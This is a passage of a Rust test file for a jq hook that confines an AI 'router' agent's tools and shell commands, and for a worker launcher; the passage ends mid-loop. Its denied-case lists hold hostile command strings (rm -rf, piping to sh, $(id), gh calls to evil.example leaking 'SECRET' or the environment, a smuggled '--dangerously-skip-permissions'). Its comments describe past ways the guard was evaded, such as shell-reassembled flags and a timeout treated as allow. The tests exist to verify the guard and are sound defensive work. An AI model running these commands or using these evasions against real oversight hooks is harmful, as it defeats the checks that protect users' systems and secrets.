//! The router's enforcement surface (E-ROUTER close review): the PreToolUse guard
//! `scripts/router-guard.jq` as `.claude/settings.json` wires it, the headless launcher
//! `scripts/router-worker.sh` (with a stub `claude`) including its `wait` mode, and the shipped PUSHED watch probe.
//! Needs `jq`, `sh`, `uuidgen` and `shasum` on PATH, as the guard and launcher do.
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};
use std::time::{Duration, Instant};
use tempfile::TempDir;

mod common;

fn root() -> &'static Path {
    Path::new(env!("CARGO_MANIFEST_DIR"))
}

/// Run the guard on one PreToolUse input; Some(reason) = denied, None = allowed.
fn guard(agent: &str, tool: &str, input: serde_json::Value) -> Option<String> {
    let event = serde_json::json!({"agent_type": agent, "tool_name": tool, "tool_input": input, "cwd": "/r"});
    let mut p = Command::new("jq")
        .args(["-c", "-f"])
        .arg(root().join("scripts/router-guard.jq"))
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();
    std::io::Write::write_all(&mut p.stdin.take().unwrap(), event.to_string().as_bytes()).unwrap();
    decision(&event, p.wait_with_output().unwrap())
}

/// The guard's verdict on `event` from its process output; Some(reason) = denied, None = allowed.
fn decision(event: &serde_json::Value, o: Output) -> Option<String> {
    assert!(o.status.success(), "guard errored on {event}: {}", String::from_utf8_lossy(&o.stderr));
    let out = String::from_utf8(o.stdout).unwrap();
    if out.trim().is_empty() {
        return None;
    }
    let v: serde_json::Value = serde_json::from_str(&out).unwrap();
    assert_eq!(v["hookSpecificOutput"]["permissionDecision"], "deny", "{out}");
    Some(v["hookSpecificOutput"]["permissionDecisionReason"].as_str().unwrap().to_string())
}

fn bash(cmd: &str) -> Option<String> {
    guard("router", "Bash", serde_json::json!({ "command": cmd }))
}

fn settings() -> serde_json::Value {
    serde_json::from_str(&std::fs::read_to_string(root().join(".claude/settings.json")).unwrap()).unwrap()
}

/// Blocker 1 of the close review: `--out""put=` (and kin) reached the shell as `--output=` because the
/// hook judged raw shell text by substring. Every documented shape still passes.
#[test]
fn router_bash_guard_judges_plain_words_so_shell_cannot_reassemble_a_denied_flag() {
    for denied in [
        r#"git log -1 --format=#!/bin/sh%n --out""put=scripts/router-worker.sh"#,
        "git log -1 --out''put=x",
        r"git log -1 --out\put=x",
        "git log -1 --out{put,}=x",
        "git log -1 --outp=x",
        "git show --output=x HEAD",
        "git log $(id)",
        "git log `id`",
        "git status; rm -rf x",
        "git log | sh",
        "git log > x",
        "git log\nrm x",
        "git log -- *.rs",
        "gh pr list -R evil.example/a/b",
        "gh pr list --repo=evil.example/a/b",
        // fix-round re-check: a -R inside a short-flag cluster, a PR URL, gh's jq over the environment
        "gh pr list -dR evil.example/a/b",
        "gh pr view -cRevil.example/a/b 1",
        "gh pr view https://evil.example/o/SECRET/pull/1",
        "gh pr list --json number -q env",
        "gh pr view 1 --web",
        "scripts/router-worker.sh spawn a ../x .router/briefs/a.md opus",
        "scripts/router-worker.sh wait ../x",
        "scripts/router-worker.sh wait n;id",
        "scripts/router-worker.sh wait $(id)",
        "rm -rf x",
        "claude -p hi",
        "kill 1",
        "git -c core.pager=sh log",
        "scripts/router-watch.sh pushed 1a2b3c4 main --upload-pack=x",
        "scripts/router-watch.sh commit -b x y",
        "scripts/router-watch.sh commit b 1a2b3c4 ../x",
        "X=1 scripts/router-watch.sh signed 1a2b3c4",
        "scripts/router-watch.sh watch main",
        "scripts/router-watch.sh signed",
        "scripts/router-watch.sh signed $(id)",
        // the watch word class: plain words only, never a dots-only path, a rev expression or a flag
        "scripts/router-watch.sh merged 1a2b3c4 main+x",
        "scripts/router-watch.sh commit a:b 1a2b3c4",
        "scripts/router-watch.sh signed HEAD^",
        "scripts/router-watch.sh signed HEAD~1",
        "scripts/router-watch.sh merged 1a2b3c4 main@{1}",
        r#"scripts/router-watch.sh signed "1a2b3c4""#,
        "scripts/router-watch.sh signed '1a2b3c4'",
        r"scripts/router-watch.sh signed 1a2b\3c4",
        "scripts/router-watch.sh signed  1a2b3c4",
        "scripts/router-watch.sh commit b 1a2b3c4 .",
        "scripts/router-watch.sh commit b 1a2b3c4 ..",
        "scripts/router-watch.sh commit b 1a2b3c4 ...",
        "scripts/router-watch.sh pushed 1a2b3c4 a--output",
        "scripts/router-watch.sh signed x=y",
    ] {
        assert!(bash(denied).is_some(), "guard allowed {denied:?}");
    }
    // DoS: an unbounded trim once ran past the hook's 10s timeout, which Claude Code treats as allow
    let t = Instant::now();
    assert!(bash(&format!("rm -rf x{}y", " ".repeat(100_000))).is_some());
    assert!(t.elapsed() < Duration::from_secs(3), "guard took {:?} on a long command", t.elapsed());
    assert!(bash("rm x").unwrap().contains("scripts/router-watch.sh commit|signed|merged|pushed|tagged"), "deny message omits the watch shape");

    let mut allowed = vec![
        "git log --oneline -5".to_string(),
        "git diff HEAD~1 HEAD^ -- src/main.rs".into(),
        "git log -1 --notes=mr --format=%N 9787799dccec525966570861689ccb6e2c2fc615".into(),
        "git show HEAD:src/main.rs".into(),
        "gh pr view 12 --json title,state".into(),
        "gh pr list --state open -L 5 --author vuluu".into(),
        "gh pr status".into(),
        "scripts/router-worker.sh spawn e-x-w1 /Users/o/Keel-x .router/briefs/e-x-w1.md opus".into(),
        "scripts/router-worker.sh resume e-x-w1 0b8a4f4e-1c2d-4e5f-8a9b-0c1d2e3f4a5b /Users/o/Keel-x .router/briefs/e-x-w1-r1.md opus --effort high".into(),
        "scripts/router-worker.sh wait e-x-w1".into(),
        "scripts/router-worker.sh wait e-x-w1 30".into(),
        "scripts/router-watch.sh commit wu/E-SEED2/w12-owner-watch fa5a25d16d953d5858c35b58e6025a6a7903ff8b skills/keel-router/SKILL.md .claude/skills/keel-router/SKILL.md".into(),
        "scripts/router-watch.sh signed fa5a25d16d953d5858c35b58e6025a6a7903ff8b".into(),
        "scripts/router-watch.sh merged fa5a25d epic/E-SEED2".into(),
        "scripts/router-watch.sh pushed fa5a25d main".into(),
        "scripts/router-watch.sh tagged v0.2.0 fa5a25d".into(),
        "scripts/router-watch.sh commit b fa5a25d .claude/x .a.b/c".into(),
    ];
    // permissions.allow serves workers and the router alike: every router entry is a shape the guard
    // accepts (one source of truth, no drift); every worker-only entry is one it refuses the router.
    // `wait` (E-SEED2.W8) and `router-watch.sh` (E-SEED2.W12) are router entries; cargo/keel are
    // worker-only, and these shapes stay refused whether or not settings lists them.
    let mut worker_only: Vec<String> =
        ["cargo test", "cargo build", "keel notes write test", "keel preflight wu HEAD", "keel check"].map(String::from).to_vec();
    for a in settings()["permissions"]["allow"].as_array().unwrap() {
        let a = a.as_str().unwrap().strip_prefix("Bash(").unwrap().strip_suffix(')').unwrap();
        let cmd = match a.strip_suffix(" *") {
            Some(p) if p.ends_with(" wait") => format!("{p} n 15"),
            Some(p) if p.ends_with("router-watch.sh") => format!("{p} signed 1a2b3c4"),
            Some(p) if p.starts_with("scripts/") => format!("{p} n /w .router/briefs/n.md opus"),
            Some(p) => format!("{p} HEAD"),
            None => a.to_string(),
        };
        if ["cargo ", "keel "].iter().any(|w| a.starts_with(w)) {
            worker_only.push(cmd);
        } else {
            allowed.push(cmd);
        }
    }
    for ok in &allowed {
        assert_eq!(bash(ok), None, "guard denied documented shape {ok:?}");
    }
    for w in &worker_only {
        assert!(bash(w).is_some(), "guard allowed worker-only {w:?} to the router");
    }
}

/// Review of 67b0de5: the guard must split gh's argv the way gh's flag parser (pflag) does. A
/// single-dash long name is a short flag plus an attached value to gh (`-label` = `-l abel`), so
/// the "value" after it becomes a flag of its own (`-label -R evil` really contacted evil.invalid);
/// a value starting with `-` is the same hole from the other side. Lists every leak, not the first.
#[test]
fn router_bash_guard_reads_gh_flags_as_gh_does() {
    let denied = [
        "gh pr list -label -R evil.example/a/b",
        "gh pr list -limit -R x/a/b",
        "gh pr list -author -R x/a/b",
        "gh pr list -label -q env --json number",
        "gh pr list -l -R x/a/b",
        "gh pr list -label --repo x/a/b",
        "gh pr list -author -w",
        // -s is --state to gh: only its enum check stops these today
        "gh pr list -state -R x/a/b",
        "gh pr list -search -R x/a/b",
        // gh has no -b/-h short today; one added later would make these live
        "gh pr list -base -R x/a/b",
        "gh pr list -head -R x/a/b",
        "gh pr view 1 -json -R x/a/b",
        // a value that is itself flag-shaped, and a short letter spelled as a long name
        "gh pr list --label -q env",
        "gh pr list --json=-R x/a/b",
        "gh pr list -L=-R x/a/b",
        "gh pr list --L 5",
    ];
    let leaks: Vec<_> = denied.iter().filter(|c| bash(c).is_none()).collect();
    assert!(leaks.is_empty(), "guard allowed {leaks:#?}");

    for ok in [
        "gh pr view 12 --json title,state",
        "gh pr list --state open -L 5 --author vuluu",
        "gh pr list -L=5 -s=open",
        "gh pr status",
        "gh pr status --json=a,b",
        "gh pr list -l bug -A vuluu -B main -H wu/x -S fix --label x --limit 3 --base main --head x --search y",
    ] {
        assert_eq!(bash(ok), None, "guard denied documented shape {ok:?}");
    }
}

/// Blocker 2 of the close review: `Agent`-tool subagents report their own agent_type, so the router
/// guard never sees them; the router may not start one, nor use any tool its agent file omits.
#[test]
fn router_guard_confines_the_router_to_its_tools_and_leaves_other_agents_alone() {
    for t in ["Agent", "Task", "Edit", "MultiEdit", "NotebookEdit", "Monitor", "SendMessage", "mcp__x__y"] {
        assert!(guard("router", t, serde_json::json!({})).is_some(), "router may use {t}");
    }
    assert!(guard("router", "Skill", serde_json::json!({"skill": "code-review"})).is_some());
    assert_eq!(guard("router", "Skill", serde_json::json!({"skill": "keel-router"})), None);
    assert_eq!(guard("router", "Read", serde_json::json!({"file_path": "/etc/hosts"})), None);
    assert_eq!(guard("router", "Write", serde_json::json!({"file_path": "/r/.router/briefs/w1.md"})), None);
    for p in ["/r/.router/briefs/../x.md", "/r/scripts/router-worker.sh", "/r/.router/briefs/sub/x.md", "/r/.router/briefs/.x.md"] {
        assert!(guard("router", "Write", serde_json::json!({ "file_path": p })).is_some(), "router may Write {p}");
    }
    for a in ["worker", "general-purpose"] {
        assert_eq!(guard(a, "Bash", serde_json::json!({"command": "rm -rf x; claude -p hi"})), None);
        assert_eq!(guard(a, "Agent", serde_json::json!({})), None);
    }

    // the guard's tool list is exactly router.md's tools: line
    let agent = std::fs::read_to_string(root().join(".claude/agents/router.md")).unwrap();
    let mut md: Vec<&str> = agent.lines().find_map(|l| l.strip_prefix("tools:")).unwrap().split(',').map(str::trim).collect();
    let jq = std::fs::read_to_string(root().join("scripts/router-guard.jq")).unwrap();
    let def = jq.lines().find_map(|l| l.strip_prefix("def tools: [")).unwrap();
    let mut g: Vec<&str> = def.split(']').next().unwrap().split(',').map(|s| s.trim().trim_matches('"')).collect();
    md.sort();
    g.sort();
    assert_eq!(md, g, "router.md tools: and the guard's tools differ");
    assert!(!md.contains(&"Agent"), "router.md grants Agent");
}

/// E-ROUTERFIX.W2: the router may learn when a worker goes idle or exits, but never send it content:
/// a worker is a full-tool session, so router text reaching it would be an unsnapshotted brief.
#[test]
fn router_guard_allows_send_message_only_as_a_contentless_idle_subscription() {
    let send = |i: serde_json::Value| guard("router", "SendMessage", i);
    for ok in [
        serde_json::json!({"to": "e-x-w1", "notify_when_idle": true}),
        serde_json::json!({"to": "e-x-w1 [3fa9c1]", "notify_when_idle": true, "message": "", "summary": "watch w1"}),
    ] {
        assert_eq!(send(ok.clone()), None, "guard denied subscription {ok}");
    }
    for denied in [
        serde_json::json!({"to": "e-x-w1", "notify_when_idle": true, "message": "also run rm -rf"}),
        serde_json::json!({"to": "e-x-w1", "message": "hi"}),
        serde_json::json!({"to": "e-x-w1", "message": ""}),
        serde_json::json!({"to": "e-x-w1", "notify_when_idle": false}),
        serde_json::json!({"to": "e-x-w1", "notify_when_idle": "true"}),
        serde_json::json!({"to": "e-x-w1", "notify_when_idle": true, "message": {"type": "shutdown_request"}}),
        serde_json::json!({"to": "e-x-w1", "notify_when_idle": true, "attachment": "x"}),
        serde_json::json!({"notify_when_idle": true}),
        serde_json::json!("e-x-w1"),
    ] {
        assert!(send(denied.clone()).is_some(), "guard allowed {denied}");
    }
    assert_eq!(guard("router", "ListAgents", serde_json::json!({})), None);
    assert_eq!(guard("worker", "SendMessage", serde_json::json!({"to": "x", "message": "hi"})), None);
}

/// Important of the close review: a hook that errors (no jq, no guard file) must deny, not allow.
#[test]
fn settings_run_the_guard_on_every_tool_and_fail_closed() {
    let pre = settings()["hooks"]["PreToolUse"].as_array().unwrap().clone();
    assert_eq!(pre.len(), 1, "one PreToolUse group: the guard");
    assert!(pre[0].get("matcher").is_none(), "the guard must see every tool");
    let cmd = pre[0]["hooks"][0]["command"].as_str().unwrap().to_string();
    let run = |dir: &Path, path: &str| {
        let mut p = common::cmd("/bin/sh")
            .args(["-c", &cmd])
            .env("CLAUDE_PROJECT_DIR", dir)
            .env("PATH", path)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
        let ev = r#"{"agent_type":"router","tool_name":"Agent","tool_input":{}}"#;
        std::io::Write::write_all(&mut p.stdin.take().unwrap(), ev.as_bytes()).unwrap();
        p.wait_with_output().unwrap()
    };
    let path = std::env::var("PATH").unwrap();
    let o = run(root(), &path);
    assert!(o.status.success() && String::from_utf8_lossy(&o.stdout).contains("\"deny\""), "{o:?}");
    let empty = TempDir::new().unwrap();
    assert_eq!(run(empty.path(), &path).status.code(), Some(2), "missing guard file must block");
    assert_eq!(run(root(), empty.path().to_str().unwrap()).status.code(), Some(2), "missing jq must block");
}

/// Layered on `common::cmd`: every git a test runs, directly or under a script, reads only the
/// repo's own config: no user or system setting (tag.gpgSign, log.showSignature, core.quotePath,
/// ...) can change what it does.
fn hermetic(c: &mut Command) -> &mut Command {
    c.env("GIT_CONFIG_GLOBAL", "/dev/null").env("GIT_CONFIG_NOSYSTEM", "1")
}

/// Upper bound on any wait for another process; a hung script fails the test instead of hanging it.
const BOUND: Duration = Duration::from_secs(10);

fn git(d: &Path, a: &[&str]) -> Output {
    let o = hermetic(&mut common::cmd("git"))
        .args(["-c", "core.hooksPath=/dev/null"])
        .args(a)
        .current_dir(d)
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@t")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@t")
        .output()
        .unwrap();
    assert!(o.status.success(), "git {a:?}: {}", String::from_utf8_lossy(&o.stderr));
    o
}

struct Launcher {
    _d: TempDir,
    main: PathBuf,
    wt: PathBuf,
    wt2: PathBuf,
    stub: PathBuf,
    release: PathBuf,
}

/// The stub `claude` the launcher starts through $ROUTER_CLAUDE; its behaviour is described on `launcher`.
fn stub_claude(stub: &Path) {
    std::fs::write(stub, concat!(
        "#!/bin/sh\necho \"stub $*\"\nprintf '[%s]' \"$@\"; echo\n",
        "held() { [ ! -e \"$STUB_RELEASE\" ] && [ -d \"${STUB_RELEASE%/*}\" ] && kill -0 \"$STUB_OWNER\" 2>/dev/null; }\n",
        "(while held; do sleep 0.05; done) | cut -c 1 &\n",
        "while held; do\n",
        "  [ ! -e \"$STUB_RELEASE.busy\" ] || /bin/sh -c 'while [ -e \"$STUB_RELEASE.busy\" ] && [ ! -e \"$STUB_RELEASE\" ] && kill -0 \"$STUB_OWNER\" 2>/dev/null; do sleep 0.05; done; :'\n",
        "  sleep 0.05\ndone\nwait\n"
    )).unwrap();
    std::fs::set_permissions(stub, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
}

/// `wait` and `router-watch.sh` sleep once per poll; this `<base>/shim/sleep` counts the polls in
/// $STEP_DIR/polls and blocks poll n until the test creates $STEP_DIR/go-n, so each poll judges a
/// state the test has set. It ends with its caller or the test process.
fn sleep_shim(base: &Path) {
    std::fs::create_dir_all(base.join("shim")).unwrap();
    std::fs::write(base.join("shim/sleep"), concat!(
        "#!/bin/sh\nn=$(( $(cat \"$STEP_DIR/polls\" 2>/dev/null || echo 0) + 1 ))\n",
        "echo \"$n\" > \"$STEP_DIR/polls.tmp\" && mv \"$STEP_DIR/polls.tmp\" \"$STEP_DIR/polls\"\n",
        "while [ ! -e \"$STEP_DIR/go-$n\" ] && kill -0 \"$STUB_OWNER\" 2>/dev/null && kill -0 \"$PPID\" 2>/dev/null; do /bin/sleep 0.02; done\n"
    )).unwrap();
    std::fs::set_permissions(base.join("shim/sleep"), std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
}

/// A repo whose main checkout holds the launcher, two linked worktrees, a stub claude and a `sleep`
/// shim. The stub prints its argv (joined, then each argument bracketed so boundaries are visible) and
/// stays alive until $STUB_RELEASE exists, so the launcher's startup window never races a timer; it
/// also exits once the test's temp dir or the test process ($STUB_OWNER) is gone, so a failed test
/// leaks no stub. While held it keeps a subshell piped to `cut -c` (long-lived children that are not
/// `<shell> -c`, as an MCP server is), and runs a `sh -c` child, as a Bash tool command runs, while
/// $STUB_RELEASE.busy exists.
fn launcher() -> Launcher {
    let d = TempDir::new().unwrap();
    let base = d.path().canonicalize().unwrap();
    let main = base.join("main");
    std::fs::create_dir_all(main.join("scripts")).unwrap();
    std::fs::create_dir_all(main.join(".router/briefs")).unwrap();
    std::fs::copy(root().join("scripts/router-worker.sh"), main.join("scripts/router-worker.sh")).unwrap();
    std::fs::write(main.join(".gitignore"), ".router/\n").unwrap();
    std::fs::write(main.join(".router/briefs/b.md"), "do the thing\n").unwrap();
    std::fs::create_dir_all(main.join(".keel")).unwrap();
    std::fs::write(main.join(".keel/config.toml"), git(root(), &["show", "HEAD:.keel/config.toml"]).stdout).unwrap();
    git(&main, &["init", "-q", "-b", "main"]);
    git(&main, &["add", "."]);
    git(&main, &["commit", "-qm", "base"]);
    git(&main, &["worktree", "add", "-q", "../wt", "-b", "w"]);
    git(&main, &["worktree", "add", "-q", "../wt2", "-b", "w2"]);
    let stub = base.join("claude");
    stub_claude(&stub);
    sleep_shim(&base);
    Launcher { main, wt: base.join("wt"), wt2: base.join("wt2"), stub, release: base.join("release"), _d: d }
}

impl Launcher {
    fn run(&self, args: &[&str]) -> (bool, String) {
        self.run_env(args, &[])
    }

    fn cmd(&self, args: &[&str], env: &[(&str, &str)]) -> Command {
        let mut c = common::cmd("sh");
        c.arg("scripts/router-worker.sh")
            .args(args)
            .current_dir(&self.main)
            .env("ROUTER_CLAUDE", &self.stub)
            .env("STUB_RELEASE", &self.release)
            .env("STUB_OWNER", std::process::id().to_string())
            .env("CLAUDE_CONFIG_DIR", self.main.parent().unwrap().join("config"))
            .env("ROUTER_WAIT_POLL", "0.2")
            .envs(env.iter().copied());
        c
    }

    fn run_env(&self, args: &[&str], env: &[(&str, &str)]) -> (bool, String) {
        let o = self.cmd(args, env).output().unwrap();
        (o.status.success(), format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr)))
    }

    /// Start `wait` in the background, as the router runs it, its polls stepped by the test.
    fn wait_stepped(&self, args: &[&str], k: &str) -> Stepped {
        let base = self.main.parent().unwrap();
        let dir = base.join(format!("steps-{k}"));
        std::fs::create_dir_all(&dir).unwrap();
        let path = format!("{}:{}", base.join("shim").display(), std::env::var("PATH").unwrap());
        let owner = std::process::id().to_string();
        let env = [("STEP_DIR", dir.to_str().unwrap()), ("STUB_OWNER", owner.as_str()), ("PATH", path.as_str())];
        let child = self.cmd(args, &env).stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap();
        Stepped { child, dir }
    }

    /// Spawn or resume worker n, held alive until `release` is created; returns the launcher's line.
    fn hold(&self, args: &[&str], release: &Path) -> String {
        let owner = std::process::id().to_string();
        let (ok, out) = self.run_env(args, &[("STUB_RELEASE", release.to_str().unwrap()), ("STUB_OWNER", owner.as_str())]);
        assert!(ok && out.starts_with("RUNNING"), "{out}");
        out
    }

    /// The session transcript `wait` reads for this spawn, under the stubbed CLAUDE_CONFIG_DIR. Claude
    /// Code names the project dir after the worktree, but truncates a long name and appends a hash, and
    /// encodes non-ASCII per UTF-16 unit; the dir here matches no re-derivable rule, so `wait` must find
    /// the transcript by its unique session id alone.
    fn transcript(&self, wt: &Path, sid: &str) -> PathBuf {
        let enc: String = wt.to_str().unwrap().chars().map(|c| if c.is_ascii_alphanumeric() { c } else { '-' }).collect();
        let dir = self.main.parent().unwrap().join("config/projects").join(format!("{}-1k9x2q", &enc[..enc.len().min(20)]));
        std::fs::create_dir_all(&dir).unwrap();
        dir.join(format!("{sid}.jsonl"))
    }

    /// Commit `config` as the main checkout's .keel/config.toml (None: remove it), the HEAD the launcher reads.
    fn commit_config(&self, config: Option<&str>) {
        let f = self.main.join(".keel/config.toml");
        match config {
            Some(c) => std::fs::write(&f, c).unwrap(),
            None => std::fs::remove_file(&f).unwrap(),
        }
        git(&self.main, &["add", "-A", ".keel"]);
        git(&self.main, &["commit", "-qm", "config"]);
    }

    /// Release every held stub, wait (bounded) until the worker recorded in <name>.pid has exited,
    /// then re-arm the hold for the next run.
    fn wait_exit(&self, name: &str) {
        std::fs::write(&self.release, "").unwrap();
        let pid = std::fs::read_to_string(self.main.join(format!(".router/out/{name}.pid"))).unwrap();
        let t = Instant::now();
        while Command::new("kill").args(["-0", pid.trim()]).stderr(Stdio::null()).status().unwrap().success() {
            assert!(t.elapsed() < Duration::from_secs(20), "stub worker never exited");
            std::thread::sleep(Duration::from_millis(100));
        }
        std::fs::remove_file(&self.release).unwrap();
    }
}

fn field<'a>(out: &'a str, k: &str) -> &'a str {
    out.split_whitespace().find_map(|w| w.strip_prefix(k)).unwrap_or_else(|| panic!("no {k} in {out}"))
}

/// The launcher's refusals (none had a test before the close review) and the two importants it
/// fixed: one live run per name, and <name>.out holding only the latest run's report.
#[test]
fn launcher_refuses_unsafe_targets_binds_resume_and_runs_one_worker_per_name() {
    let l = launcher();
    let wt = l.wt.to_str().unwrap();
    let wt2 = l.wt2.to_str().unwrap();
    let main = l.main.to_str().unwrap();
    let brief = ".router/briefs/b.md";
    for (args, why) in [
        (vec!["spawn", "n", main, brief, "opus"], "may not run in"),
        (vec!["spawn", "n", "/tmp", brief, "opus"], "not a registered worktree"),
        (vec!["spawn", "-n", wt, brief, "opus"], "bad name"),
        (vec!["spawn", "n", wt, brief, "gpt"], "model must be opus ([router] worker_model in .keel/config.toml)"),
        (vec!["spawn", "n", wt, brief, "sonnet"], "model must be opus ([router] worker_model in .keel/config.toml)"),
        (vec!["spawn", "n", wt, brief, "haiku"], "model must be opus ([router] worker_model in .keel/config.toml)"),
        (vec!["spawn", "n", wt, brief, "fable"], "model must be opus ([router] worker_model in .keel/config.toml)"),
        (vec!["resume", "n", "0b8a4f4e-1c2d-4e5f-8a9b-0c1d2e3f4a5b", wt, brief, "sonnet"], "model must be opus"),
        (vec!["spawn", "n", wt, "scripts/router-worker.sh", "opus"], "file must be a .md under"),
    ] {
        let (ok, out) = l.run(&args);
        assert!(!ok && out.contains(why), "{args:?} not refused for {why}: {out}");
    }
    std::os::unix::fs::symlink(l.main.join(".router/briefs/b.md"), l.main.join(".router/briefs/s.md")).unwrap();
    let (ok, out) = l.run(&["spawn", "n", wt, ".router/briefs/s.md", "opus"]);
    assert!(!ok && out.contains("symlinks refused"), "{out}");

    let (ok, out) = l.run(&["spawn", "n", wt, brief, "opus"]);
    assert!(ok && out.starts_with("RUNNING"), "{out}");
    let sid = field(&out, "session=").to_string();
    let copy = field(&out, "brief=").to_string();
    assert!(copy.starts_with(wt) && std::fs::read_to_string(&copy).unwrap() == "do the thing\n", "{out}");

    // a second run under a live name is refused, spawn or resume
    let (ok, out) = l.run(&["spawn", "n", wt2, brief, "opus"]);
    assert!(!ok && out.contains("still running"), "{out}");
    let (ok, out) = l.run(&["resume", "n", &sid, wt, brief, "opus"]);
    assert!(!ok && out.contains("still running"), "{out}");
    l.wait_exit("n");

    // resume is bound to the spawn's name, session and worktree
    let (ok, out) = l.run(&["resume", "n", &sid, wt2, brief, "opus"]);
    assert!(!ok && out.contains("was spawned in"), "{out}");
    let (ok, out) = l.run(&["resume", "m", &sid, wt, brief, "opus"]);
    assert!(!ok && out.contains("no recorded spawn"), "{out}");
    let (ok, out) = l.run(&["resume", "n", &sid, wt, brief, "opus"]);
    assert!(ok && out.starts_with("RUNNING"), "{out}");
    l.wait_exit("n");

    let log = std::fs::read_to_string(l.main.join(".router/out/n.out")).unwrap();
    assert_eq!(log.matches("stub ").count(), 1, "n.out must hold only the latest run:\n{log}");
    assert!(log.contains(&format!("--resume {sid}")), "{log}");

    // E-SEED2.W7 (DEC-39): the policy is [router] in .keel/config.toml as committed at HEAD; anything
    // the launcher's narrow reader does not accept refuses the run and starts nothing
    let ok_policy = "[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n";
    let mut policy_refusals = vec![(None, "absent".to_string())];
    for (bad, what) in [
        ("code_paths = [\"src/\"]\n", "no [router]"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"high\"]\n", "missing key"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"max\"\n", "default not in list"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"ultracode\"]\nworker_default_effort = \"medium\"\n", "unknown level"),
        ("[router]\nworker_model = opus\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n", "unquoted"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\" \"high\"]\nworker_default_effort = \"medium\"\n", "list without comma"),
        (&format!("{ok_policy}worker_model = \"opus\"\n"), "repeated key"),
        (&format!("{ok_policy}worker_extra = \"x\"\n"), "unknown key"),
        ("[router]\nworker_model = \"opus\"\n[other]\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n", "key outside the section"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"high\"]\n[other]\nworker_default_effort = \"medium\"\n", "key after another section"),
        (&ok_policy.replace('\n', "\r\n"), "CRLF"),
        (&ok_policy.replace("worker_model = ", "worker_model\t=\t"), "tabs around ="),
        (&ok_policy.replace("\"opus\"", "'opus'"), "single quotes"),
        ("[router]\nworker_model = \"opus\"\nworker_efforts = []\nworker_default_effort = \"medium\"\n", "empty array"),
        (&ok_policy.replace("\"high\"]", "\"high\",]"), "trailing comma"),
        (&ok_policy.replace("[\"medium\", \"high\"]", "[\n  \"medium\",\n  \"high\",\n]"), "multi-line array"),
        (&format!("{ok_policy}[router.x]\ny = 1\n"), "[router.x]"),
        (&format!("{ok_policy}[[router]]\n"), "[[router]]"),
        (&format!("{ok_policy}[ router ]\n"), "spaced header"),
        (&format!("{ok_policy}[\"router\"]\n"), "quoted header"),
        (&format!("  {ok_policy}"), "indented header"),
        (&format!("{ok_policy}  [router]\n"), "indented second header"),
        (&format!("{ok_policy}[router]\n"), "duplicate section"),
        ("[router]\nworker_model = \"opus\"\n[review]\nx = 1\n[router]\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n", "split section"),
        (&ok_policy.replace("[router]\n", "[router]\t\n"), "trailing tab on header"),
        (&ok_policy.replace("[router]\n", "[router] \n"), "trailing space on header"),
        (&ok_policy.replace("\"opus\"", "\"--dangerously-skip-permissions\""), "model starting with -"),
        (&ok_policy.replace("\"opus\"", "\"4opus\""), "model starting with a digit"),
        (&ok_policy.replace("worker_default_effort = \"medium\"", "worker_default_effort = \"-medium\""), "effort starting with -"),
        ("[router]\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n", "missing worker_model"),
        (&ok_policy.replace("[router]\n", "[router]# c\n"), "no space before the header's comment"),
        (&format!("{ok_policy}\t[router]\n"), "tab-indented second header"),
        (&format!("{ok_policy}[\trouter]\n"), "tab inside a second header"),
        (&format!("{ok_policy}[router\t]\n"), "tab before a second header's ]"),
        (&ok_policy.replace("worker_model", "  worker_model"), "indented worker_model"),
        (&ok_policy.replace("worker_default_effort", "  worker_default_effort"), "indented worker_default_effort"),
        (&ok_policy.replace("worker_efforts", "  worker_efforts"), "indented worker_efforts"),
        (&ok_policy.replace("\"opus\"", "\"opus\" x"), "junk after worker_model"),
        (&ok_policy.replace("= \"medium\"\n", "= \"medium\" x\n"), "junk after worker_default_effort"),
        (&ok_policy.replace("\"high\"]", "\"high\"] x"), "junk after worker_efforts"),
        (&ok_policy.replace("worker_model = ", "worker_model  =  "), "two spaces around = (model)"),
        (&ok_policy.replace("worker_default_effort = ", "worker_default_effort  =  "), "two spaces around = (default)"),
        (&ok_policy.replace("worker_efforts = ", "worker_efforts  =  "), "two spaces around = (efforts)"),
        (&ok_policy.replace("worker_efforts = ", "worker_efforts= "), "no space before = (efforts)"),
        (&format!("{ok_policy}worker_default_effort = \"medium\"\n"), "repeated worker_default_effort"),
        (&format!("{ok_policy}worker_efforts = [\"medium\", \"high\"]\n"), "repeated worker_efforts"),
        (&ok_policy.replace("\"opus\"", "\"opus x\""), "model with a space"),
        (&ok_policy.replace("\"opus\"", "\"opUs\""), "model with a capital"),
        (&ok_policy.replace("= \"medium\"\n", "= \"medium high\"\n"), "default with a space"),
        (&ok_policy.replace("[\"medium\", \"high\"]", "[\"medium high\"]"), "list entry with a space"),
        (&ok_policy.replace("\"high\"]", "\"high medium\"]"), "later list entry with a space"),
        (&ok_policy.replace("\"medium\", \"high\"", "\"medium\",  \"high\""), "two spaces after a comma"),
        (&ok_policy.replace("\"high\"]", "\"below\"]"), "level word below"),
        (&ok_policy.replace("\"high\"]", "\"highest\"]"), "level word highest"),
    ] {
        policy_refusals.push((Some(bad.to_string()), what.to_string()));
    }
    for (config, what) in policy_refusals {
        l.commit_config(config.as_deref());
        let (ok, out) = l.run(&["spawn", "q", wt, brief, "opus"]);
